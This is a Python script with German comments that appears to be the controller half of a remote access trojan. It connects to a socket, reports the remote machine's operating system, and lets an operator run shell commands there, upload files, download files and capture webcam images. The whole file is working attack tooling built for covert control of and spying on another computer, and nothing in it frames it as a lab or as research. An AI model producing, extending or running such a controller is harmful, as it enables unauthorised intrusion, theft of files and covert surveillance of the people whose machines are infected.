import socket
import os

try:
    os.system('cls')
except:
    os.system('clear')

HOST = '127.0.0.1'  # ip zu der die connection hergestellt werden soll
PORT = 8080

print(">> Warten auf Verbindung bei " + HOST + ":" + str(PORT))

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        break
    except:
        pass

print(">> Verbindung established")
ops = s.recv(256)
print(">> Operating System : " + str(ops, "utf8"))


def cam():
    picsi = s.recv(256)
    if "error" not in str(picsi, "utf8"):
        picsize = int(str(picsi, "utf8"))
        picdata = s.recv(picsize)
        pic = open("cam.png", "wb")
        pic.write(picdata)
        pic.flush()
        pic.close()
        picob = s.recv(256)
        print(str(picob, "utf8"))
    else:
        print("ERROR")


def put(befehl):
    bef = befehl.split(" ")
    pfilename = bef[1]
    if os.path.isfile(pfilename):
        pfile = open(pfilename, "rb")
        pdata = pfile.read()
        pfile.close()
        psize = os.path.getsize(pfilename)
        s.send(bytes(str(psize), "utf8"))
        s.send(pdata)
        pob = s.recv(256)
        print(str(pob, "utf8"))
    else:
        print("File does not exist")


def get(befehl):
    bef = befehl.split(" ")
    gfilename = bef[1]
    gsi = s.recv(256)
    if "error" not in str(gsi, "utf8"):
        gsize = int(str(gsi, "utf8"))
        gdata = s.recv(gsize)
        gfile = open(str(gfilename), "wb")
        gfile.write(gdata)
        gfile.flush()
        gfile.close()
        gob = s.recv(256)
        print(str(gob, "utf8"))
    else:
        print("File does not exist")


def command():
    while True:
        befehl = input(">> " + HOST + " >> ")
        if befehl == "quit":
            s.send(bytes("quit", "utf8"))
            s.close()
            break
        elif "put" in befehl:
            s.send(bytes(str(befehl), "utf8"))
            put(befehl)

        elif "get" in befehl:
            s.send(bytes(str(befehl), "utf8"))
            get(befehl)

        elif "cam" in befehl:
            s.send(bytes(str(befehl), "utf8"))
            cam()

        elif befehl == "":
            pass

        else:
            s.send(bytes(str(befehl), "utf8"))
            output = s.recv(1000000)
            print(str(output, "utf8"))


command()
